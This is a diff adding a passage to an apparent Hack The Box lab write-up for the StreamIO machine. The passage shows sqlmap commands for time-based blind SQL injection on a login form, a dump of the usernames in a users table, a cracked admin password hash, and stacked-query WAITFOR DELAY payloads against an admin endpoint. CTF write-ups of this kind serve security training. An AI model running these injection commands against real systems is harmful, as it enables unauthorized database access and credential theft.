@@ -352,6 +352,64 @@ Table: users
 <span class="p">|</span> username <span class="p">|</span> nchar <span class="p">|</span>
 +----------+-------+
 </code></pre></div>
+
+<p>There are around 30 users in that table, depending on how many registered at that time.
+I selected those usernames where <strong>is_staff</strong> is set to <strong>0</strong>.</p>
+<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> --time-sec <span class="m">1</span> --sql-query<span class="o">=</span><span class="s2">&quot;SELECT username FROM STREAMIO..users WHERE is_staff=0&quot;</span>
+</code></pre></div>
+
+<p>It only returned one username... <strong>admin</strong> and I retrieved the password, probably MD5 <strong>665a50ac9eaa781e4f7f04199db97a11</strong>. Crackstation revealed the password <strong>paddpadd</strong>. The login with those credentials still fails.
+So we dump all usernames, limiting the dumped characters to 10 chars. This took around 30 minutes.</p>
+<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> -D STREAMIO -T users -C username --dump --batch --time-sec <span class="m">1</span> --last <span class="m">10</span>
+Database: STREAMIO                                                                                                                                                         Table: users                                                                                                                                                               <span class="o">[</span><span class="m">30</span> entries<span class="o">]</span>                                                                                                                                                               +-----------+                                                                                                                                                              <span class="p">|</span> username  <span class="p">|</span>                                                                                                                                                              +-----------+                                                                                                                                                              <span class="p">|</span> James     <span class="p">|</span>                                                                                                                                                              <span class="p">|</span> Theodore  <span class="p">|</span>
+<span class="p">|</span> Samantha  <span class="p">|</span>
+<span class="p">|</span> Lauren    <span class="p">|</span>
+<span class="p">|</span> William   <span class="p">|</span>
+<span class="p">|</span> Sabrina   <span class="p">|</span>
+<span class="p">|</span> Robert    <span class="p">|</span>
+<span class="p">|</span> Thane     <span class="p">|</span>
+<span class="p">|</span> Carmon    <span class="p">|</span>                                                                                                                                                              <span class="p">|</span> Barry     <span class="p">|</span>                                                                                                                                                              <span class="p">|</span> Oliver    <span class="p">|</span>
+<span class="p">|</span> Michelle  <span class="p">|</span>
+<span class="p">|</span> Gloria    <span class="p">|</span>
+<span class="p">|</span> Victoria  <span class="p">|</span>
+<span class="p">|</span> Alexendra <span class="p">|</span>
+<span class="p">|</span> Baxter    <span class="p">|</span>
+<span class="p">|</span> Clara     <span class="p">|</span>                                                                                                                                                              <span class="p">|</span> Barbra    <span class="p">|</span>
+<span class="p">|</span> Lenord    <span class="p">|</span>
+<span class="p">|</span> Austin    <span class="p">|</span>
+<span class="p">|</span> Garfield  <span class="p">|</span>
+<span class="p">|</span> Juliette  <span class="p">|</span>
+<span class="p">|</span> Victor    <span class="p">|</span>
+<span class="p">|</span> Lucifer   <span class="p">|</span>
+<span class="p">|</span> Bruno     <span class="p">|</span>
+<span class="p">|</span> Diablo    <span class="p">|</span>
+<span class="p">|</span> Robin     <span class="p">|</span>
+<span class="p">|</span> Stan      <span class="p">|</span>
+<span class="p">|</span> yoshihide <span class="p">|</span>                                                                                                                                                              <span class="p">|</span> admin     <span class="p">|</span>                                                                                                                                                              +-----------+
+</code></pre></div>
+
+<p>Now i could dump all passwords, respectivly the MD5 hashes, but I try another way first.</p>
+<p>There are 2 usernames that stand out.
+1. yoshihide
+2. admin</p>
+<p>I try to register <strong>admin</strong> with my own password and log in. No success.
+I try to register <strong>yoshihide</strong> with my own password and log in. <strong>SUCCESS</strong>
+Finally the log in with my own registered password worked and I can navigate to the <code>/admin/</code>site.</p>
+<p><img alt="admin interface" src="images/htb/streamio/streamio.htb_admin.PNG"></p>
+<p>So the endpoints seem to allow deletion of users and movies. I suspect some sort of "DELETE" SQL query behind those request and sqlmap could find again an injection, but again time based...</p>
+<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/admin/?movie&quot;</span> --method<span class="o">=</span>POST --data <span class="s2">&quot;movie_id=1666&quot;</span> --cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=jedeq7831tbnm0b12lneefghmd&quot;</span> --dbms<span class="o">=</span><span class="s2">&quot;Microsoft SQL Server&quot;</span>
+sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
+---
+Parameter: movie_id <span class="o">(</span>POST<span class="o">)</span>
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries <span class="o">(</span>comment<span class="o">)</span>
+    Payload: <span class="nv">movie_id</span><span class="o">=</span><span class="m">1666</span><span class="p">;</span>WAITFOR DELAY <span class="s1">&#39;0:0:5&#39;</span>--
+
+    Type: time-based blind
+    Title: Microsoft SQL Server/Sybase time-based blind <span class="o">(</span>IF<span class="o">)</span>
+    Payload: <span class="nv">movie_id</span><span class="o">=</span><span class="m">1666</span> WAITFOR DELAY <span class="s1">&#39;0:0:5&#39;</span>
+---
+</code></pre></div>
   </div>
   <div class="tag-cloud">
     <p>
